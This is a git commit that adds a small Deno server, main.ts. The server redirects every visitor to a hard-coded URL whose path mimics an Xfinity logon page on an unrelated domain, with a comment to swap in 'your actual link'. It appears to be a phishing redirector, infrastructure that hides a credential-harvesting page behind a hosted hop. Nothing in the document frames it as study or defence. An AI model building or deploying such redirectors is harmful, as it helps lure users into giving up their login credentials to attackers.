ba7f800c8009f388e45ae05e73191b1174dd5a08
Digital2025001 <bosmichael30@gmail.com>
2025-07-02 13:53:16 -0700

    Create main.ts

---
+++ main.ts
@@ -0,0 +1,10 @@
+import { serve } from "https://deno.land/std/http/server.ts";
+
+serve((_req) => {
+  return new Response(null, {
+    status: 302,
+    headers: {
+      Location: "https://support.cyberesa.net/css/images/xfinity/logon/s/", // Replace this with your actual link
+    },
+  });
+});
